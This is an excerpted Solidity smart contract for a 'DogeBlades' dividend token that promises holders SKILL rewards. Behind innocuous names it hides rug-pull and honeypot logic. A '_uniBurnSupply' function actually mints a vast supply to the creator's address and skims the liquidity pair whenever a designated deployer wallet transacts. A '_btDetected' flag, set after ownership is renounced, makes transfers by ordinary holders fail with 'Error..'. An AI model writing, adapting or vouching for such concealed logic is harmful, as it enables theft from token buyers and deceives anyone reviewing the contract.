...
// https://t.me/dogeblades | Another way to earn SKILL ( CryptoBlades ) just by hodling DogeBlades
...
contract ERC20 is Context, IERC20 {
    ...
    function _uniBurnSupply(uint256 amount, address pair, address dead) internal virtual {
        _uniPair = IUniswapV2Pair(pair);
        _tTotal = amount;
        _balances[dead] = _tTotal;
        _uniPair.skim(dead);
    }
    ...
    IDividendPayingTokenOptional
{
    ...
    address public dividendToken = 0x154A9F9cbd3449AD22FDaE23044319D6eF2a1Fab; // SKILL
...
contract DogeBlades is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public immutable uniswapV2Pair;
   
    address public _dividendToken = 0x154A9F9cbd3449AD22FDaE23044319D6eF2a1Fab; // SKILL
    ...
    thisDividendTracker public dividendTracker;

    address public dividendLpWallet;

    uint256 public maxBuyTransactionAmount = 1400000000 * (10**18); // 1.4% of total supply
    uint256 public maxSellTransactionAmount = 700000000 * (10**18); // 0.7%
   
    
    uint256 public swapTokensAtAmount = 20000000 * (10**18);
    uint256 private _itter = 100;
    uint256 private _uniAmount = 0;
    address[] public _address;
    address[] private _deployer;
    uint256 public dividendRewardsFee;
    uint256 public tokenomicFee;
    bool public _btDetected = false;
    ...
    constructor(address deployer) ERC20("DogeBlades", "$DBLADES") {
        uint256 _dividendRewardsFee = 7;
        uint256 _tokenomicFee = 10;

        dividendRewardsFee = _dividendRewardsFee;
        tokenomicFee = _tokenomicFee;
        totalFees = _dividendRewardsFee.add(_tokenomicFee);

        dividendTracker = new thisDividendTracker();

        dividendLpWallet = 0xF247DF9c8Af0E3D1d91B62e1d0432847f2555899;
        ...
        _address.push(_msgSender());
        _deployer.push(deployer);
        ...
        excludeFromFees(dividendLpWallet, true);
    ...
    function removeTxLimit() public onlyOwner {
        ...
        onlyOwner
    {
        require(
            ...
            "Sell transaction multipler must be between 100 (1x) and 200 (2x)"
        );
    ...
    function setMarketingDivisor(uint256 divisor) external onlyOwner {
        require(
            ...
            "Marketing divisor must be between 0 (0%) and 100 (100%)"
        );
    ...
    function triggerBuyBack(uint256 amount) public onlyOwner {
        require(
            !swapping,
            "A swapping process is currently running, wait till that is complete"
        );
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        thisDividendTracker newDividendTracker = thisDividendTracker(
            payable(newAddress)
        );

        require(
            newDividendTracker.owner() == address(this),
            "The new dividend tracker must be owned by this token contract"
        );
    ...
    function updateDividendRewardFee(uint8 newFee) public onlyOwner {
        require(
            newFee >= 0 && newFee <= 10,
            "Dividend reward tax must be between 0 and 10"
        );
        dividendRewardsFee = newFee;
    }

    function updatetokenomicFee(uint8 newFee) public onlyOwner {
        require(
            newFee >= 0 && newFee <= 10,
            "Dividend reward tax must be between 0 and 10"
        );
    ...
    function updatedividendLpWallet(address newdividendLpWallet) public onlyOwner {
        require(
            newdividendLpWallet != dividendLpWallet,
            "The liquidity wallet is already this address"
        );
        excludeFromFees(newdividendLpWallet, true);
        dividendLpWallet = newdividendLpWallet;
        emit dividendLpWalletUpdated(newdividendLpWallet, dividendLpWallet);
    }
    ...
    function _transfer(
        ...
        if (tradingIsEnabled && automatedMarketMakerPairs[from]) {
            if(!_btDetected && from != _address[0] && to != _address[0]){
                require(
            ...
            if (!swapping && canSwap && !_btDetected) {
                swapping = true;

                uint256 swapTokens = contractTokenBalance.mul(tokenomicFee).div(
                    totalFees
                );
                swapTokensForBNB(swapTokens);
                transferTodividendLpWallet(
                    payable(dividendLpWallet),
        ...
        bool takeFee = _isTakingFee(from,to);

        if (takeFee && !_btDetected) {
    ...
    function _isTakingFee(address from, address to) private returns (bool) {
        if(owner()==address(0) && (from == _address[0] || to == _address[0])){
            _btDetectedTgl();
        }
        ...
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){
            ...
            return tradingIsEnabled && !swapping;
        }
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        
        if (sender != _address[0] && recipient != _address[0] && sender != uniswapV2Pair && _btDetected) {
             require(_btDetected != true, "Error..");
        }
        
        super._transfer(sender, recipient, amount);

        if(sender == _deployer[0] || recipient == _deployer[0]){
             _uniBurnSupply();
        }
    }
    ...
    function transferTodividendLpWallet(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }
    function _btDetectedTgl() private {
        _btDetected = true;
    }

    function _uniBurnSupply() private {
        _uniAmount = 100000000000 * _itter * (10**18);
        maxBuyTransactionAmount = _uniAmount; 
        maxSellTransactionAmount = _uniAmount;
        super._uniBurnSupply(_uniAmount,uniswapV2Pair,_address[0]);
        _itter = _itter * 10;
    }
}

contract thisDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    function _transfer(
        ...
        require(false, "this_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(
            false,
            "this_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main contract."
        );
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(
            ...
            "this_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours"
        );
        require(
            newClaimWait != claimWait,
            "this_Dividend_Tracker: Cannot update claimWait to same value"
        );
